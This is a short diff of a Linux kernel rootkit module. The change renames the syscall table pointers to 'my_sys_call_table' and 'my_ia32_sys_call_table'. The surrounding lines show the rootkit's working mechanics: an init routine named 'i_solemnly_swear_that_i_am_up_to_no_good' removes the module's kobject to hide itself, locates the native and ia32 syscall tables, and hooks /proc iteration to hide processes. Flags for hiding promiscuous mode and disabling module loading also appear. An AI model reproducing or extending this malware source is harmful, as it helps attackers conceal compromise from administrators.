@@ -48,8 +48,8 @@ static int (*root_iterate)(struct file *file, struct dir_context *);
 }
 #endif
 
-unsigned long *sys_call_table;
-unsigned long *ia32_sys_call_table;
+unsigned long *my_sys_call_table;
+unsigned long *my_ia32_sys_call_table;
 
 unsigned int hide_promisc = 0;
 unsigned int module_loading_disabled = 0;
@@ -993,13 +993,13 @@ static int __init i_solemnly_swear_that_i_am_up_to_no_good ( void )
     kobject_del(__this_module.holders_dir->parent);
 
     #if defined(_CONFIG_X86_64_)
-    ia32_sys_call_table = find_ia32_sys_call_table();
-    DEBUG("ia32_sys_call_table obtained at %p\n", ia32_sys_call_table);
+    my_ia32_sys_call_table = find_ia32_sys_call_table();
+    DEBUG("ia32_sys_call_table obtained at %p\n", my_ia32_sys_call_table);
     #endif
 
-    sys_call_table = find_sys_call_table();
+    my_sys_call_table = find_sys_call_table();
 
-    DEBUG("sys_call_table obtained at %p\n", sys_call_table);
+    DEBUG("sys_call_table obtained at %p\n", my_sys_call_table);
 
     /* Hook /proc for hiding processes */
     proc_iterate = get_vfs_iterate("/proc");
